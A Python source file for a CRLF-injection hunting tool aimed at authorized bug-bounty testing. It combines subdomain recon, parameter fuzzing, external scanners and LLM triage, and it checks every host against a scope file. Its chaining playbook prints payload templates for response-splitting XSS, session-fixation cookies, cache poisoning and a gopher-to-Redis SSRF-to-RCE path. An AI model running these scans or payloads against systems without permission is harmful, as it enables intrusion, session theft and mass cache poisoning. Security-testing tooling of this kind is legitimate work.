#!/usr/bin/env python3
"""
crlf_hunt.py: holistic CRLF injection hunter with an LLM triage agent.

You give it a domain, a wildcard, or a single URL. It does:
  recon -> parameter discovery -> CRLF fuzzing (built-in + crlfuzz +
  CRLFsuite + nuclei) -> double-confirm -> LLM triage -> report draft.

ONLY run against targets you are authorized to test. Every host it
touches must match the scope file, or it is skipped.

Quick start:
  pip3 install requests
  pipx install crlfsuite        # optional engine
  go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest   # optional
  printf 'target.com\n*.target.com\n' > scope.txt
  python3 crlf_hunt.py -d target.com --scope scope.txt

  # single URL + LLM triage via a free local model (Ollama):
  python3 crlf_hunt.py -u https://app.target.com/p --scope scope.txt \
      --llm --llm-provider ollama --model llama3.1

LLM providers (see --help): claude-code | anthropic | openai | ollama.
  claude-code : uses your Claude Pro/Max login via the Claude Code CLI, no
                API key. Install Claude Code and run `claude` once to log in,
                then: --llm --llm-provider claude-code
  anthropic   : pay-as-you-go Anthropic API key in ANTHROPIC_API_KEY (this is
                billed separately; a Pro/Max subscription does NOT grant it).
  ollama      : free local model. Install Ollama, `ollama pull llama3.1`.
  openai      : any OpenAI-compatible endpoint (OpenRouter free models, Groq,
                Gemini-compat). Set --llm-base-url and LLM_API_KEY.
"""
import argparse
import fnmatch
import json
import os
import re
import shutil
import subprocess
import sys
import time
import uuid
from pathlib import Path
from urllib.parse import urlparse, parse_qsl

import requests

UA = "Mozilla/5.0 (crlf-hunt; authorized testing)"


def log(m):
    print(m, flush=True)


def have(tool):
    return shutil.which(tool) is not None


def run(cmd, stdin=None, timeout=1800):
    if not have(cmd[0]):
        return None  # engine optional; caller decides
    try:
        p = subprocess.run(cmd, input=stdin, capture_output=True,
                           text=True, timeout=timeout)
        return [l.strip() for l in p.stdout.splitlines() if l.strip()]
    except subprocess.TimeoutExpired:
        log(f"[!] {cmd[0]} timed out")
        return []


def load_lines(path):
    return [l.strip() for l in Path(path).read_text().splitlines()
            if l.strip() and not l.startswith("#")]


def _match_allow(host, pat):
    pat = pat.lower()
    if pat.startswith("*."):                 # *.x -> apex x and any subdomain
        base = pat[2:]
        return host == base or host.endswith("." + base)
    if "*" in pat:
        return fnmatch.fnmatch(host, pat)
    return host == pat                       # bare domain -> that exact host only


def _match_deny(host, pat):
    pat = pat.lower()
    if pat.startswith("*."):
        base = pat[2:]
        return host == base or host.endswith("." + base)
    if "*" in pat:
        return fnmatch.fnmatch(host, pat)
    # a bare deny host blocks itself AND its subdomains (safer)
    return host == pat or host.endswith("." + pat)


def in_scope(host, scope):
    """Allow/deny scope. Lines starting with ! or - are EXCLUSIONS. A host is in
    scope only if it matches an allow line and no deny line. Glob * is honored
    (e.g. !scaledsolutions*.uber.com, !*.uber.com.cn)."""
    host = (host or "").lower().split(":")[0].strip()
    if not host:
        return False
    allows = [s for s in scope if not s.startswith(("!", "-"))]
    denies = [s[1:].strip() for s in scope if s.startswith(("!", "-"))]
    if any(_match_deny(host, d) for d in denies):
        return False
    return any(_match_allow(host, a) for a in allows)


# ---------------------------------------------------------------- recon
def recon(args, scope):
    if args.url:
        start = args.url if args.url.startswith("http") else "https://" + args.url
        seed = urlparse(start).hostname
        live = [start]
    else:
        dom = args.domain.lstrip("*.")
        seed = dom
        subs = set(run(["subfinder", "-d", dom, "-all", "-silent"]) or [])
        try:
            data = requests.get(f"https://crt.sh/?q=%25.{dom}&output=json",
                                timeout=30).json()
            for row in data:
                for n in row.get("name_value", "").split("\n"):
                    subs.add(n.replace("*.", "").strip())
        except (requests.RequestException, ValueError):
            log("[!] crt.sh failed, continuing")
        subs = {s for s in subs if s and in_scope(s, scope)}
        log(f"[*] {len(subs)} in-scope subdomains")
        Path("subs.txt").write_text("\n".join(sorted(subs)) + "\n")  # for the takeover module
        live = run(["httpx", "-silent"], stdin="\n".join(sorted(subs))) or list(subs)

    live = [u for u in live if in_scope(urlparse(u if u.startswith('http') else 'https://'+u).hostname, scope)]
    Path("live.txt").write_text("\n".join(live) + "\n")
    log(f"[*] {len(live)} live in-scope hosts")

    urls = set()
    # --- fast archive sources (no live crawl): the real coverage for big targets ---
    if have("gau"):
        urls.update(run(["gau", "--subs", seed], timeout=600) or [])
    if have("waybackurls"):
        # feed the live hostnames so we pull their archived URLs, not just the apex
        hosts = []
        for u in live:
            h = urlparse(u if u.startswith("http") else "https://" + u).hostname
            if h:
                hosts.append(h)
        hosts = sorted(set(hosts))[:args.wayback_cap]
        if hosts:
            urls.update(run(["waybackurls"], stdin="\n".join(hosts), timeout=600) or [])
    # --- live crawl: katana, bounded so it can't stall ---
    if not args.no_crawl and have("katana") and live:
        cap = max(1, args.crawl_cap)
        # --crawl-all loops through EVERY live host in cap-sized batches;
        # otherwise only the first batch is crawled (archives cover the rest).
        batches = [live[i:i + cap] for i in range(0, len(live), cap)] \
            if args.crawl_all else [live[:cap]]
        if args.crawl_all and len(batches) > 1:
            log(f"[*] katana: crawling ALL {len(live)} live hosts in "
                f"{len(batches)} batches of {cap}")
        elif len(live) > cap:
            log(f"[*] katana: crawling first {cap} of {len(live)} live hosts "
                f"(archives cover the rest; use --crawl-all for all)")
        for bi, subset in enumerate(batches, 1):
            Path("crawl.txt").write_text("\n".join(subset) + "\n")
            kdepth = "3" if len(subset) <= 10 else "2"
            before = len(urls)
            urls.update(run(["katana", "-list", "crawl.txt", "-jc", "-d", kdepth,
                             "-c", "25", "-rl", "250", "-timeout", "8",
                             "-silent"], timeout=600) or [])
            if args.crawl_all and len(batches) > 1:
                log(f"    batch {bi}/{len(batches)}: +{len(urls) - before} URLs "
                    f"({len(urls)} total)")
    if not urls:  # at least test what we were given
        urls.update(live)

    cands = sorted({u for u in urls
                    if "=" in urlparse(u).query
                    and in_scope(urlparse(u).hostname, scope)})
    Path("params.txt").write_text("\n".join(cands) + "\n")
    log(f"[*] {len(cands)} in-scope URLs with parameters")
    return cands


# ---------------------------------------------------------- chaining
# Params whose value is often fetched/parsed server-side -> SSRF -> RCE surface.
FETCHER_PARAMS = {
    "url", "uri", "u", "dest", "destination", "redirect", "redirect_url",
    "redirect_uri", "next", "return", "returnurl", "return_url", "continue",
    "callback", "webhook", "proxy", "fetch", "feed", "image", "img", "file",
    "path", "git", "repo", "host", "port", "to", "out", "view", "domain",
    "site", "data", "reference", "ref", "target", "link", "load", "page",
}


def looks_like_fetcher(name):
    n = name.lower()
    return n in FETCHER_PARAMS or any(k in n for k in ("url", "uri", "redirect", "host", "callback", "webhook", "fetch", "proxy"))


def analyze_chains(f):
    """Return the escalation paths a confirmed CRLF point plausibly opens.
    Each carries a MANUAL PoC template for Burp Repeater. Nothing is auto-fired."""
    ev = " ".join(f.get("evidence", [])).lower()
    name = f.get("param", "")
    chains = []

    # 1. Response splitting -> reflected XSS (from your notes)
    chains.append({
        "name": "CRLF -> HTTP response splitting -> XSS",
        "severity": "high",
        "why": "If the server emits a full second response, a script body executes in-browser.",
        "poc": f"{name}=%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0aContent-Length:39%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E",
        "steps": ["Send in Repeater (disable auto Content-Length).",
                  "Open the URL in a browser; confirm the alert fires.",
                  "Swap alert for document.cookie / fetch() to show real impact."],
    })

    # 2. Set-Cookie seen -> session fixation
    if "set-cookie" in ev or looks_like_fetcher(name):
        chains.append({
            "name": "CRLF -> Set-Cookie -> session fixation",
            "severity": "medium",
            "why": "Attacker fixes a known session/CSRF cookie in the victim's browser.",
            "poc": f"{name}=%0d%0aSet-Cookie:sessionid=ATTACKER_FIXED;Path=/",
            "steps": ["Confirm the cookie lands in the response.",
                      "Show it sticks across an authenticated request."],
        })

    # 3. Location injection -> open redirect (chains to OAuth token theft / ATO)
    if "location" in ev or looks_like_fetcher(name):
        chains.append({
            "name": "CRLF -> Location -> open redirect -> token/ATO",
            "severity": "medium",
            "why": "A forced redirect can leak OAuth codes or tokens if this sits in an auth flow.",
            "poc": f"{name}=%0d%0aLocation:https://YOUR-OOB-HOST/",
            "steps": ["Confirm the 30x goes to your host.",
                      "If in an OAuth/SSO flow, chase leaked code/token in the request."],
        })

    # 4. Response splitting -> web cache poisoning (mass impact)
    chains.append({
        "name": "CRLF -> response splitting -> web cache poisoning",
        "severity": "high",
        "why": "A cached split response is served to other users. Test ONLY if the program allows cache attacks.",
        "poc": f"{name}=%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a%3Ch1%3Epoisoned%3C/h1%3E",
        "steps": ["Check for a cache (Age/X-Cache headers, CDN).",
                  "Confirm the poisoned response is served to a second, clean request.",
                  "Stop at a benign marker; do not serve malicious content to real users."],
    })

    # 5. SSRF -> RCE via protocol injection (the GitLab git:// -> Redis case)
    if looks_like_fetcher(name):
        chains.append({
            "name": "CRLF -> SSRF -> RCE (protocol/queue injection)",
            "severity": "critical",
            "why": "If this value is fetched server-side, CRLF can inject into gopher/redis/dict/smtp. "
                   "Reaching an internal Redis/queue (like the GitLab git://->Redis report) can reach RCE.",
            "poc": f"{name}=gopher://127.0.0.1:6379/_<CRLF-separated Redis commands>   # FILL IN MANUALLY",
            "steps": ["First prove outbound SSRF with --oob-url (your own listener).",
                      "Enumerate internal services (127.0.0.1:6379 redis, :11211 memcached, 169.254.169.254 metadata).",
                      "Only against IN-SCOPE infra with explicit permission, craft the gopher/redis payload by hand.",
                      "Never fire RCE at third-party or out-of-scope internal hosts."],
        })

    return chains


def inject(url, name, payload):
    """Replace one parameter's value with the payload, leaving others intact."""
    pat = re.compile(r"([?&]" + re.escape(name) + r"=)[^&#]*")
    return pat.sub(lambda m: m.group(1) + payload, url, count=1)


# Headers that legitimately echo the request URL. A token reflected inside one
# of these (e.g. a 301 that upgrades scheme and copies the query string into
# Location) is NOT header injection — it is URL reflection, and was the #1 source
# of false positives. A real split puts the token in its OWN header line.
REFLECT_HEADERS = {"location", "content-location", "refresh", "link",
                   "content-security-policy", "content-security-policy-report-only"}


def real_injection_headers(resp, token):
    """Evidence headers that prove a REAL injection: the token appears in a
    header NAME (a brand-new header line), or in a header VALUE whose name is not
    one of the URL-echoing headers above. Token sitting only inside Location (and
    friends) is reflection, not a split, so it is ignored."""
    hits = []
    for k, v in resp.headers.items():
        if token in k:                                   # new header line injected
            hits.append(f"{k}: {v}")
        elif token in v and k.lower() not in REFLECT_HEADERS:
            hits.append(f"{k}: {v}")
    return hits[:5]


def probe(session, url, token, delay):
    time.sleep(delay)
    try:
        r = session.get(url, allow_redirects=False, timeout=10)
    except requests.RequestException:
        return None
    return r if real_injection_headers(r, token) else None


def oob_probe(session, url, name, oob):
    """Safe SSRF reachability check: inject a request to the USER's own OOB
    listener only. Detects whether the value is fetched server-side. Attacks
    nothing third-party; you watch your own listener for the callback."""
    tok = uuid.uuid4().hex[:8]
    for payload in (f"https://{oob}/ssrf-{tok}",
                    f"%0d%0aLocation:https://{oob}/crlf-{tok}"):
        try:
            session.get(inject(url, name, payload), allow_redirects=False, timeout=10)
        except requests.RequestException:
            pass
    return tok  # grep your listener logs for this token


def _save_partial(findings):
    """Write findings as they come, so an interruption/quota never loses them."""
    try:
        Path("findings_builtin.json").write_text(json.dumps(findings, indent=2))
    except OSError:
        pass


def builtin_fuzz(args, cands, payloads):
    """Concurrent fuzzer: many DIFFERENT hosts in parallel, but each host is hit
    no faster than --delay (probe() sleeps per request and a host's URLs run in
    one thread). Full coverage, fast, yet gentle on any single server."""
    import threading
    from concurrent.futures import ThreadPoolExecutor

    workers = getattr(args, "workers", 15)
    by_host = {}
    for url in cands:
        by_host.setdefault(urlparse(url).hostname or "", []).append(url)

    findings, oob_log = [], []
    lock = threading.Lock()
    tests = [0]
    stop = threading.Event()
    done = [0]

    def do_host(urls):
        s = requests.Session()
        s.headers["User-Agent"] = UA
        for url in urls:
            if stop.is_set():
                return
            with lock:
                done[0] += 1
                if done[0] % 200 == 0:
                    log(f"[*] progress: {done[0]}/{len(cands)} URLs, "
                        f"{tests[0]} tests, {len(findings)} hits")
            names = {n for n, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)}
            for name in names:
                if args.oob_url and looks_like_fetcher(name):
                    tok = oob_probe(s, url, name, args.oob_url)
                    with lock:
                        oob_log.append(f"{tok}  {name} @ {url}")
                for tpl in payloads:
                    with lock:
                        if tests[0] >= args.max_tests:
                            stop.set()
                            return
                        tests[0] += 1
                    tok = "cr" + uuid.uuid4().hex[:10]
                    r = probe(s, inject(url, name, tpl.replace("{T}", tok)), tok, args.delay)
                    if not r:
                        continue
                    tok2 = "cr" + uuid.uuid4().hex[:10]
                    r2 = probe(s, inject(url, name, tpl.replace("{T}", tok2)), tok2, args.delay)
                    with lock:
                        findings.append({
                            "engine": "builtin", "url": inject(url, name, tpl.replace("{T}", tok)),
                            "param": name, "payload": tpl.replace("{T}", tok),
                            "status": r.status_code,
                            "evidence": real_injection_headers(r, tok),
                            "confirmed": r2 is not None,
                        })
                        _save_partial(findings)
                    log(f"[HIT] {'confirmed' if r2 else 'single'}  {name} @ {url}")
                    break

    log(f"[*] builtin: {len(by_host)} hosts, {len(cands)} URLs, "
        f"{workers} workers, {args.delay}s per-host delay")
    try:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            list(ex.map(do_host, by_host.values()))
    except KeyboardInterrupt:
        stop.set()
        log(f"\n[!] interrupted — {len(findings)} hits saved to findings_builtin.json")

    if oob_log:
        Path("oob_ssrf_probes.txt").write_text("\n".join(oob_log) + "\n")
        log(f"[*] {len(oob_log)} OOB SSRF probes -> check your listener")
    log(f"[*] builtin: {tests[0]} requests, {len(findings)} hits")
    _save_partial(findings)
    return findings


# ---------------------------------------------------------- other engines
def engine_crlfuzz(cands):
    if not have("crlfuzz"):
        log("[-] crlfuzz not installed, skipping")
        return []
    Path("params.txt").write_text("\n".join(cands) + "\n")
    log("[*] crlfuzz...")
    out = run(["crlfuzz", "-l", "params.txt", "-s"]) or []
    Path("crlfuzz.txt").write_text("\n".join(out) + "\n")
    return [{"engine": "crlfuzz", "url": u, "param": "-", "payload": "-",
             "status": "-", "evidence": ["flagged by crlfuzz"],
             "confirmed": False} for u in out if u.startswith("http")]


def engine_crlfsuite(cands):
    if not have("crlfsuite"):
        log("[-] crlfsuite not installed, skipping")
        return []
    Path("params.txt").write_text("\n".join(cands) + "\n")
    log("[*] CRLFsuite...")
    run(["crlfsuite", "-iT", "params.txt", "-sL", "-oJ", "crlfsuite.json"])
    try:
        data = json.loads(Path("crlfsuite.json").read_text())
        urls = data if isinstance(data, list) else data.get("vulnerable", [])
    except (FileNotFoundError, ValueError):
        urls = []
    return [{"engine": "crlfsuite", "url": u, "param": "-", "payload": "-",
             "status": "-", "evidence": ["flagged by CRLFsuite"],
             "confirmed": False} for u in urls]


def engine_nuclei(cands):
    if not have("nuclei"):
        log("[-] nuclei not installed, skipping")
        return []
    Path("params.txt").write_text("\n".join(cands) + "\n")
    log("[*] nuclei (crlf tags)...")
    out = run(["nuclei", "-l", "params.txt", "-tags", "crlf", "-silent"]) or []
    Path("nuclei_crlf.txt").write_text("\n".join(out) + "\n")
    return [{"engine": "nuclei", "url": o, "param": "-", "payload": "-",
             "status": "-", "evidence": ["flagged by nuclei"],
             "confirmed": False} for o in out]


# ---------------------------------------------------------- LLM agent
def llm_triage(f, args):
    chains = analyze_chains(f) if f.get("confirmed") else []
    chain_hint = "; ".join(c["name"] for c in chains) or "none auto-suggested"
    prompt = f"""You are triaging a suspected CRLF / HTTP header injection from an AUTHORIZED bug-bounty scan, and planning how to CHAIN it to higher impact. Be skeptical: rule out plain body reflection, cache/proxy artifacts, and header normalization.

Engine: {f['engine']}
URL: {f['url']}
Parameter: {f['param']}  (fetcher-like: {looks_like_fetcher(f['param'])})
Payload: {f['payload']}
Status: {f['status']}
Injected header evidence: {f['evidence']}
Double-confirmed by re-test: {f['confirmed']}
Candidate chains detected: {chain_hint}

Reason about the full kill chain, not just the primitive: CRLF -> response splitting -> XSS; -> Set-Cookie -> session fixation; -> Location -> open redirect -> OAuth token theft / account takeover; -> response splitting -> web cache poisoning (mass impact); and, IF the sink fetches the value server-side, CRLF -> SSRF -> protocol/queue injection (gopher/redis/dict) -> RCE, as in the GitLab git://->Redis case. Pick the highest REALISTIC chain the evidence supports; do not invent impact.

Return ONLY JSON:
{{"real": true/false, "severity":"info|low|medium|high|critical", "confidence":0-100,
"best_chain":"the most plausible escalation path for THIS finding",
"next_tests":["ordered manual checks to prove the chain"],
"impact":"one sentence, only what evidence + a realistic chain supports",
"report_md":"short HackerOne-style draft: Summary, Steps to Reproduce (curl line), Impact, and a Chaining note. Claim no impact not demonstrated."}}"""

    prov = args.llm_provider
    try:
        if prov == "claude-code":
            # Uses your Claude Pro/Max login via the Claude Code CLI (no API key).
            # Run `claude` once interactively first to log in with your subscription.
            try:
                p = subprocess.run(["claude", "-p", prompt],
                                   capture_output=True, text=True, timeout=180)
            except FileNotFoundError:
                return {"error": "claude CLI not found. Install Claude Code and run "
                                 "`claude` once to log in with your Pro account."}
            except subprocess.TimeoutExpired:
                return {"error": "claude -p timed out"}
            text = p.stdout or p.stderr
        elif prov == "anthropic":
            key = os.environ.get("ANTHROPIC_API_KEY")
            if not key:
                return {"error": "ANTHROPIC_API_KEY not set"}
            r = requests.post("https://api.anthropic.com/v1/messages",
                headers={"x-api-key": key, "anthropic-version": "2023-06-01",
                         "content-type": "application/json"},
                json={"model": args.model, "max_tokens": 1200,
                      "messages": [{"role": "user", "content": prompt}]},
                timeout=120)
            text = r.json()["content"][0]["text"]
        else:  # openai-compatible (openai, ollama, groq, openrouter, gemini-compat)
            base = args.llm_base_url or (
                "http://localhost:11434/v1" if prov == "ollama"
                else "https://api.openai.com/v1")
            key = os.environ.get("LLM_API_KEY", "ollama")
            r = requests.post(base.rstrip("/") + "/chat/completions",
                headers={"Authorization": f"Bearer {key}",
                         "content-type": "application/json"},
                json={"model": args.model,
                      "messages": [{"role": "user", "content": prompt}]},
                timeout=120)
            text = r.json()["choices"][0]["message"]["content"]
        m = re.search(r"\{.*\}", text, re.S)
        return json.loads(m.group(0)) if m else {"raw": text}
    except (requests.RequestException, KeyError, ValueError, IndexError) as e:
        return {"error": str(e)}


# ---------------------------------------------------------- report
def write_report(findings, triage):
    out = ["# CRLF Hunt Report", "",
           "> VALIDATE EVERY HIT BY HAND in Burp Repeater before reporting. "
           "LLM verdicts are hints, not proof. Engine-flagged URLs "
           "(crlfuzz/CRLFsuite/nuclei) are unconfirmed until you reproduce them.",
           ""]
    for i, f in enumerate(findings, 1):
        t = triage.get(i - 1, {})
        host = urlparse(f["url"]).hostname or f["url"]
        out += [f"## {i}. [{f['engine']}] {f['param']} @ {host}",
                f"- double-confirmed: {f['confirmed']}",
                f"- LLM real/severity/confidence: {t.get('real','-')} / "
                f"{t.get('severity','-')} / {t.get('confidence','-')}",
                f"- LLM impact: {t.get('impact','-')}",
                f"- suggested next tests: {', '.join(t.get('next_tests', []) or ['-'])}",
                "", "PoC:", "```bash", f"curl -i '{f['url']}'", "```", ""]
        if f["evidence"]:
            out += ["Evidence headers:", "```", *f["evidence"], "```", ""]
        if t.get("best_chain"):
            out += [f"- LLM best chain: {t['best_chain']}", ""]
        if t.get("report_md"):
            out += ["LLM report draft (edit before use):", "", t["report_md"], ""]
        out.append("---\n")
    Path("report.md").write_text("\n".join(out))


def write_playbook(findings):
    """Per-confirmed-finding escalation playbook with manual PoC templates."""
    pb = ["# CRLF Chaining Playbook", "",
          "> Manual, authorized testing only. PoCs below are TEMPLATES you run by "
          "hand in Burp Repeater after confirming the primitive. Keep every test "
          "in scope. Do not fire RCE/cache attacks at third-party or out-of-scope hosts.",
          ""]
    confirmed = [f for f in findings if f.get("confirmed")]
    if not confirmed:
        pb += ["No double-confirmed CRLF primitives to chain yet. "
               "Confirm a hit first, then re-run.", ""]
    for i, f in enumerate(confirmed, 1):
        host = urlparse(f["url"]).hostname or f["url"]
        pb += [f"## {i}. {f['param']} @ {host}", f"Primitive URL: `{f['url']}`", ""]
        for c in analyze_chains(f):
            pb += [f"### {c['name']}  ({c['severity']})",
                   f"_{c['why']}_", "",
                   "PoC (inject this as the parameter value):",
                   "```", c["poc"], "```",
                   "Steps:", *[f"- {s}" for s in c["steps"]], ""]
        pb.append("---\n")
    Path("playbook.md").write_text("\n".join(pb))


# ---------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description="Holistic CRLF hunter + LLM agent")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-d", "--domain", help="domain or wildcard, e.g. target.com or *.target.com")
    g.add_argument("-u", "--url", help="single URL (that host only)")
    ap.add_argument("--scope", required=True, help="scope file, one host per line (*. allowed)")
    ap.add_argument("--payloads", default="crlf_payloads.txt")
    ap.add_argument("--delay", type=float, default=1.0,
                    help="seconds between requests TO THE SAME HOST (per-host throttle)")
    ap.add_argument("--workers", type=int, default=15,
                    help="how many different hosts to fuzz in parallel (default 15)")
    ap.add_argument("--max-tests", type=int, default=3000)
    ap.add_argument("--no-crawl", action="store_true",
                    help="skip katana live-crawl; use archive sources only (fast, big targets)")
    ap.add_argument("--crawl-all", dest="crawl_all", action="store_true",
                    help="crawl EVERY live host in --crawl-cap-sized batches (thorough, slow)")
    ap.add_argument("--crawl-cap", dest="crawl_cap", type=int, default=60,
                    help="live hosts per katana batch (default 60)")
    ap.add_argument("--wayback-cap", dest="wayback_cap", type=int, default=400,
                    help="max live hosts queried against the Wayback archive (default 400)")
    ap.add_argument("--params-file", dest="params_file",
                    help="skip recon; fuzz param URLs from this file (resume a saved params.txt)")
    ap.add_argument("--oob-url", help="your own OOB listener host (Burp Collaborator, "
                    "interactsh, etc.) for a SAFE SSRF-reachability probe on fetcher params")
    ap.add_argument("--engines", default="builtin,crlfuzz,crlfsuite,nuclei",
                    help="comma list: builtin,crlfuzz,crlfsuite,nuclei")
    ap.add_argument("--llm", action="store_true", help="triage findings with an LLM")
    ap.add_argument("--llm-provider", default="ollama",
                    choices=["claude-code", "anthropic", "openai", "ollama"],
                    help="claude-code = use your Claude Pro/Max login via the "
                         "Claude Code CLI (no API key)")
    ap.add_argument("--llm-base-url", help="OpenAI-compatible base URL (openai/ollama providers)")
    ap.add_argument("--model", default="llama3.1")
    args = ap.parse_args()

    scope = load_lines(args.scope)
    target = (args.domain or urlparse(args.url if args.url.startswith("http")
              else "https://" + args.url).hostname).lstrip("*.")
    if not in_scope(target, scope):
        sys.exit(f"[!] {target} is not in scope.txt. Stopping.")

    workdir = Path(f"crlf_{target}")
    workdir.mkdir(exist_ok=True)
    os.chdir(workdir)
    log(f"[*] output: {workdir.resolve()}")

    payloads = load_lines(Path(args.payloads) if Path(args.payloads).exists()
                          else Path("..") / args.payloads)
    log(f"[*] {len(payloads)} payload templates")

    if args.params_file:
        # Resume: skip the expensive recon, fuzz an already-saved params file.
        pf = Path(args.params_file)
        if not pf.exists() and (Path("..") / args.params_file).exists():
            pf = Path("..") / args.params_file
        cands = sorted({u for u in load_lines(pf)
                        if "=" in urlparse(u).query and in_scope(urlparse(u).hostname, scope)})
        log(f"[*] resume: {len(cands)} in-scope param URLs from {pf}")
    else:
        cands = recon(args, scope)
    if not cands:
        sys.exit("[!] no parameterized URLs found")

    enabled = [e.strip() for e in args.engines.split(",")]
    findings = []
    if "builtin" in enabled:
        findings += builtin_fuzz(args, cands, payloads)
    if "crlfuzz" in enabled:
        findings += engine_crlfuzz(cands)
    if "crlfsuite" in enabled:
        findings += engine_crlfsuite(cands)
    if "nuclei" in enabled:
        findings += engine_nuclei(cands)

    # de-dup by (engine, url)
    seen, uniq = set(), []
    for f in findings:
        k = (f["engine"], f["url"])
        if k not in seen:
            seen.add(k)
            uniq.append(f)
    findings = uniq
    Path("findings.json").write_text(json.dumps(findings, indent=2))
    log(f"[*] {len(findings)} findings")

    triage = {}
    if args.llm and findings:
        for i, f in enumerate(findings):
            log(f"[*] LLM triage {i+1}/{len(findings)} ({args.llm_provider}:{args.model})")
            triage[i] = llm_triage(f, args)
        Path("triage.json").write_text(json.dumps(triage, indent=2))

    write_report(findings, triage)
    write_playbook(findings)

    # Full detailed report via the AI report agent (automatic when --llm is on).
    if args.llm and findings:
        try:
            import report_agent
            report_agent.build(".", provider=args.llm_provider, model=args.model,
                               base_url=args.llm_base_url, target=target,
                               tester=os.environ.get("TESTER", "(tester)"))
        except Exception as e:  # never let reporting break the scan
            log(f"[!] report_agent skipped: {e}")

    log(f"\nDone. See {workdir.resolve()}/ : report.md, playbook.md, "
        f"REPORT_FULL.md (detailed), reports/")


if __name__ == "__main__":
    main()
